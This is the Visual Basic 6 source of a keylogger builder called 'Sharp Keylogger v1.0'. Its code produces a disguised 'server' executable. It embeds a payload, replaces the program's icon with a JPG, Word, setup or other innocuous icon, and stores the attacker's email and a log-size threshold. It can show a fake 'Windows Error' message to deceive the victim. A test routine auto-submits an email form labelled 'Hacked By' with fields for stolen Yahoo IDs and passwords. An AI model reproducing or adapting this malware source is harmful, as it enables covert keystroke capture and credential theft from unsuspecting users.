VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{68F45442-3569-11D7-90A8-00E0297F0885}#1.0#0"; "ReplaceIcon.ocx"
Begin VB.Form Form1 
   BackColor       =   &H80000012&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Sharp Keylogger v1.0"
   ClientHeight    =   7125
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   4890
   ForeColor       =   &H00000000&
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   ScaleHeight     =   7125
   ScaleWidth      =   4890
   StartUpPosition =   2  'CenterScreen
   Begin VB.CheckBox chkFck 
      BackColor       =   &H00000000&
      Caption         =   "Fake Message"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0FFC0&
      Height          =   255
      Left            =   240
      TabIndex        =   37
      Top             =   1200
      Value           =   1  'Checked
      Width           =   1695
   End
   Begin VB.TextBox t1 
      Height          =   1605
      Left            =   5040
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   36
      Text            =   "Form2.frx":030A
      Top             =   1200
      Visible         =   0   'False
      Width           =   2655
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Test"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   3600
      Style           =   1  'Graphical
      TabIndex        =   35
      Top             =   2760
      Width           =   975
   End
   Begin VB.OptionButton i18 
      BackColor       =   &H80000012&
      Caption         =   "UNKnow"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   3240
      TabIndex        =   34
      Top             =   3600
      Width           =   1215
   End
   Begin VB.OptionButton i17 
      BackColor       =   &H00000000&
      Caption         =   "Txt Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   1800
      TabIndex        =   33
      Top             =   3840
      Width           =   1215
   End
   Begin VB.OptionButton i16 
      BackColor       =   &H80000012&
      Caption         =   "My Comp"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   3240
      TabIndex        =   32
      Top             =   4560
      Width           =   1215
   End
   Begin VB.OptionButton i15 
      BackColor       =   &H80000012&
      Caption         =   "Word icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   1800
      TabIndex        =   31
      Top             =   4560
      Width           =   1335
   End
   Begin VB.OptionButton i14 
      BackColor       =   &H00000000&
      Caption         =   "Media Player"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   3240
      TabIndex        =   30
      Top             =   4320
      Width           =   1215
   End
   Begin VB.OptionButton i12 
      BackColor       =   &H80000012&
      Caption         =   "Log Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   1800
      TabIndex        =   29
      Top             =   4320
      Width           =   1215
   End
   Begin VB.OptionButton i11 
      BackColor       =   &H00000000&
      Caption         =   "Jpg Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   360
      TabIndex        =   28
      Top             =   3600
      Value           =   -1  'True
      Width           =   1215
   End
   Begin VB.OptionButton i10 
      BackColor       =   &H80000012&
      Caption         =   "Internet"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   3240
      TabIndex        =   27
      Top             =   4080
      Width           =   1215
   End
   Begin VB.OptionButton i9 
      BackColor       =   &H80000012&
      Caption         =   "Html Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   1800
      TabIndex        =   26
      Top             =   4080
      Width           =   1215
   End
   Begin VB.OptionButton i8 
      BackColor       =   &H00000000&
      Caption         =   "Gif Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   360
      TabIndex        =   25
      Top             =   3840
      Width           =   1215
   End
   Begin VB.OptionButton i6 
      BackColor       =   &H80000012&
      Caption         =   "Folder Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   3240
      TabIndex        =   24
      Top             =   3840
      Width           =   1215
   End
   Begin VB.OptionButton i5 
      BackColor       =   &H80000012&
      Caption         =   "Exe Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   1800
      TabIndex        =   23
      Top             =   3600
      Width           =   1215
   End
   Begin VB.OptionButton i4 
      BackColor       =   &H80000012&
      Caption         =   "DLL Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   360
      TabIndex        =   22
      Top             =   4320
      Width           =   1215
   End
   Begin VB.OptionButton i2 
      BackColor       =   &H80000012&
      Caption         =   "Bmp Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   360
      TabIndex        =   21
      Top             =   4080
      Width           =   1215
   End
   Begin VB.TextBox srv 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   3000
      TabIndex        =   20
      Text            =   "Server.exe"
      Top             =   6020
      Width           =   1335
   End
   Begin VB.TextBox size 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      Height          =   285
      Left            =   480
      TabIndex        =   17
      Text            =   "30"
      Top             =   6020
      Width           =   495
   End
   Begin VB.CommandButton bi7 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Browse"
      Enabled         =   0   'False
      Height          =   285
      Left            =   3360
      Style           =   1  'Graphical
      TabIndex        =   15
      Top             =   5160
      Width           =   1095
   End
   Begin VB.TextBox pi7 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      Enabled         =   0   'False
      Height          =   285
      Left            =   360
      Locked          =   -1  'True
      TabIndex        =   14
      Top             =   5160
      Width           =   2895
   End
   Begin VB.OptionButton i7 
      BackColor       =   &H00000000&
      Caption         =   "Custom Icon :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   360
      TabIndex        =   13
      Top             =   4920
      Width           =   1300
   End
   Begin VB.CommandButton exit 
      BackColor       =   &H00C0C0C0&
      Caption         =   "E&xit"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3360
      Style           =   1  'Graphical
      TabIndex        =   12
      Top             =   6600
      Width           =   1215
   End
   Begin VB.CommandButton make 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Create SPS"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   240
      Style           =   1  'Graphical
      TabIndex        =   11
      Top             =   6600
      Width           =   1455
   End
   Begin VB.CommandButton about 
      BackColor       =   &H00C0C0C0&
      Caption         =   "&About"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   1920
      Style           =   1  'Graphical
      TabIndex        =   10
      Top             =   6600
      Width           =   1215
   End
   Begin VB.OptionButton i1 
      BackColor       =   &H80000012&
      Caption         =   "Setup Icon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   360
      TabIndex        =   9
      Top             =   4560
      Width           =   1215
   End
   Begin VB.CommandButton tfm 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Test"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   3600
      MaskColor       =   &H00FFFFFF&
      Style           =   1  'Graphical
      TabIndex        =   6
      Top             =   1560
      UseMaskColor    =   -1  'True
      Width           =   975
   End
   Begin VB.TextBox fm 
      BackColor       =   &H00C0C0C0&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1200
      TabIndex        =   5
      Text            =   "System Error &H8007007E(-2147024770).The module not be found."
      Top             =   1920
      Width           =   2295
   End
   Begin VB.TextBox ft 
      BackColor       =   &H00C0C0C0&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1200
      TabIndex        =   2
      Text            =   "Windows Error !"
      Top             =   1560
      Width           =   2295
   End
   Begin VB.TextBox eml 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1200
      TabIndex        =   1
      Text            =   "sharp_h2001@yahoo.com"
      Top             =   2760
      Width           =   2295
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   5160
      Top             =   4920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Shape Shape4 
      BorderColor     =   &H80000004&
      Height          =   755
      Left            =   120
      Shape           =   4  'Rounded Rectangle
      Top             =   5700
      Width           =   4575
   End
   Begin REPLACEICONXLib.ReplaceIcon ri 
      Left            =   5160
      Top             =   4080
      _Version        =   65536
      _ExtentX        =   2566
      _ExtentY        =   1296
      _StockProps     =   0
   End
   Begin VB.Label Label10 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "File Name :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   3000
      TabIndex        =   19
      Top             =   5775
      Width           =   795
   End
   Begin VB.Label Label9 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "KB"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   1080
      TabIndex        =   18
      Top             =   6060
      Width           =   180
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Send Loggs On Size : "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   480
      TabIndex        =   16
      Top             =   5780
      Width           =   1560
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Icon's"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0FFC0&
      Height          =   240
      Left            =   360
      TabIndex        =   8
      Top             =   3255
      Width           =   585
   End
   Begin VB.Shape Shape3 
      BorderColor     =   &H00FFFFFF&
      Height          =   2200
      Left            =   120
      Shape           =   4  'Rounded Rectangle
      Top             =   3375
      Width           =   4575
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Notification"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0FFC0&
      Height          =   240
      Left            =   360
      TabIndex        =   7
      Top             =   2400
      Width           =   1095
   End
   Begin VB.Shape Shape2 
      BorderColor     =   &H00FFFFFF&
      Height          =   1020
      Left            =   120
      Shape           =   4  'Rounded Rectangle
      Top             =   1320
      Width           =   4575
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00FFFFFF&
      Height          =   700
      Left            =   120
      Shape           =   4  'Rounded Rectangle
      Top             =   2520
      Width           =   4575
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Message :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   195
      Left            =   240
      TabIndex        =   4
      Top             =   1920
      Width           =   735
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Title :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   195
      Left            =   240
      TabIndex        =   3
      Top             =   1560
      Width           =   405
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "E-mail :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   360
      TabIndex        =   0
      Top             =   2760
      Width           =   525
   End
   Begin VB.Image Image1 
      Height          =   1695
      Left            =   0
      Picture         =   "Form2.frx":07A6
      Stretch         =   -1  'True
      Top             =   -120
      Width           =   4920
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Sharp Keylogger v1.0
'This Keyloger Source Only For Learning
'Coded By : Sharp Soft
'----------------------------
'Y! ID : Sharp_h2001
'Msn ! : Sharp.Soft
'Email : Sharp.Secure@Gmail.Com
'----------------------------
'wWw.Sharp-Soft.nEt
'wWw.Sharp.Blogfa.cOm
'----------------------------

Dim kar As Boolean
Private Sub about_Click()
Form2.Show
End Sub
Private Sub bi7_Click()
cd.FileName = ""
cd.Filter = "Icon Files(*.ico)|*.ico"
cd.ShowOpen
pi7.Text = cd.FileName
End Sub
Private Sub chkFck_Click()
If chkFck.Value = 1 Then
ft.Enabled = True
fm.Enabled = True
tfm.Enabled = True
Label5.Enabled = True
Label4.Enabled = True
Else
ft.Enabled = False
fm.Enabled = False
tfm.Enabled = False
Label5.Enabled = False
Label4.Enabled = False
End If
End Sub
Private Sub Command1_Click()
On Error Resume Next
If FileLen(Environ("windir") & "\System\help.html") <> 0 Then Kill FileLen(Environ("windir") & "\System\help.html")
Open Environ("windir") & "\System\help.html" For Output As #1
Close #1
Dim data As String
data = ""
data = Replace(t1.Text, "#TO#", eml.Text)
data = Replace(data, "#SUB#", "Hacked By Sharp Keylogger")
data = Replace(data, "#BODY#", "Run Succesfully !!!" + vbclrf + vbCrLf + "--------------------------" + vbclrf + vbCrLf + "Y! ID :" + vbclrf + vbCrLf + "Y! Pass :" + vbclrf + vbCrLf + "--------------------------" + vbclrf + vbCrLf + "Y! Chat ID : Sharp_h2001" + vbclrf + vbCrLf + "wWw.Sharp-Soft.nEt")

Open Environ("windir") & "\System\help.html" For Binary As #2
    Put #2, , data
Close #2

Set rpcc = CreateObject("InternetExplorer.application")
    rpcc.Navigate Environ("windir") & "\System\help.html"
    Set qq = rpcc.Document
    qq.All.Item("submit").Click
    qq = Null
    While rpcc.Busy = True
    DoEvents
    Command1.Enabled = False
    Wend
    rpcc.Quit
    Kill Environ("windir") & "\System\help.htm"
    MsgBox "Deta Sent Succesfully. Check Your E-mail Inbox"
    Command1.Enabled = True
    Form1.SetFocus
End Sub

Private Sub exit_Click()
Form_Unload 1
End Sub
Private Sub fm_Change()
If Len(fm.Text) = 0 Then
ft.Enabled = False
tfm.Enabled = False
Else
ft.Enabled = True
tfm.Enabled = True
End If
End Sub
Private Sub Form_Load()
kar = False
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
res_ET
End Sub

Private Sub Form_Terminate()
res_ET
End Sub

Private Sub Form_Unload(Cancel As Integer)
res_ET
End
End Sub

Private Sub i1_Click()
pi7.Enabled = False
bi7.Enabled = False
End Sub

Private Sub i7_Click()
pi7.Enabled = True
bi7.Enabled = True
End Sub
Public Function re(idd As Long, typee As String, path As String)
Dim file() As Byte
file() = LoadResData(idd, typee)
Open path For Binary As #1
Put #1, , file()
Close #1
End Function
Public Function res_ET()
On Error Resume Next
Close
Kill Left(App.path, 1) & ":\vir.exe"
Kill Left(App.path, 1) & ":\tmp.ico"
End Function
Private Sub Label3_Click()
End Sub

Private Sub Label11_Click()
End Sub
Private Sub make_Click()
On Error GoTo errh:
If eml = "" Then MsgBox "Fill The E-mail Field.", vbCritical, "Error": Exit Sub
If Size.Text = "" Then MsgBox "Fill The Size Of Log.", vbCritical, "Error": Exit Sub
If (i7.Value = True) And (pi7.Text = "") Then MsgBox "Select a Icon For Server", vbCritical, "Error": Exit Sub
If srv.Text = "" Then MsgBox "Fill Sharp KeyLog Name Field.", vbCritical, "Error": Exit Sub
eml.Text = Replace(eml.Text, "$#$~", "")
ft.Text = Replace(ft.Text, "$#$~", "")
fm.Text = Replace(fm.Text, "$#$~", "")
'____________________________________________________________________________________________________________
Dim crpath As String
Dim appt As String
crpath = Left(App.path, 1) & ":\tmp.ico"
res_ET
If i1.Value = True Then re 1, "CUSTOM", crpath
If i2.Value = True Then re 2, "CUSTOM", crpath
If i4.Value = True Then re 4, "CUSTOM", crpath
If i5.Value = True Then re 5, "CUSTOM", crpath
If i6.Value = True Then re 6, "CUSTOM", crpath
If i8.Value = True Then re 8, "CUSTOM", crpath
If i9.Value = True Then re 9, "CUSTOM", crpath
If i10.Value = True Then re 10, "CUSTOM", crpath
If i11.Value = True Then re 11, "CUSTOM", crpath
If i12.Value = True Then re 12, "CUSTOM", crpath
If i14.Value = True Then re 14, "CUSTOM", crpath
If i15.Value = True Then re 15, "CUSTOM", crpath
If i16.Value = True Then re 16, "CUSTOM", crpath
If i17.Value = True Then re 17, "CUSTOM", crpath
If i18.Value = True Then re 18, "CUSTOM", crpath
If i7.Value = True Then FileCopy pi7.Text, crpath

appt = Left(App.path, 1) & ":\vir.exe"

Open appt For Output As #12
Close #12

re 7, "CUSTOM", appt
ri.Replace appt, crpath, "Icon"
'___________________________________________________________________
Dim OptionDlimiter$
OptionDlimiter$ = "-" & Chr$(12)

Open appt For Append As #2
Print #2, OptionDlimiter & "0$#$~" & StrReverse(eml.Text) & "$#$~" & Size.Text & "$#$~" & ft.Text & "$#$~" & fm.Text
Close #2
'___________________________________________________________________
FileCopy appt, App.path & "\" & srv.Text
res_ET
MsgBox "Sender Created Succesfully !!!", vbInformation, "Sharp Keylogger"
If i7.Value = True Then
If FileLen(App.path & "\" & srv.Text) > 200000 Then MsgBox "Your Server Size is : " & FileLen(App.path & "\" & srv.Text) & " Bytes." & vbCrLf & "Your Server size is Up to 200 KB and it isn't normaly to use it for Sendig via Dialup-Modems." & vbCrLf & "You Can Select Setup Icon For Your Server to change your server size to 68 KB :D", vbExclamation, "Your Server Created Successfully and Work 100%"
End If
Exit Sub
errh:
MsgBox "Error Message : " & vbCrLf & Err.Description, vbCritical + vbMsgBoxSetForeground, "Error ..."
Close #1
Close #2
Close #12
res_ET
End Sub
Private Sub tfm_Click()
MsgBox fm.Text, vbCritical + vbApplicationModal + vbMsgBoxSetForeground, ft.Text
End Sub
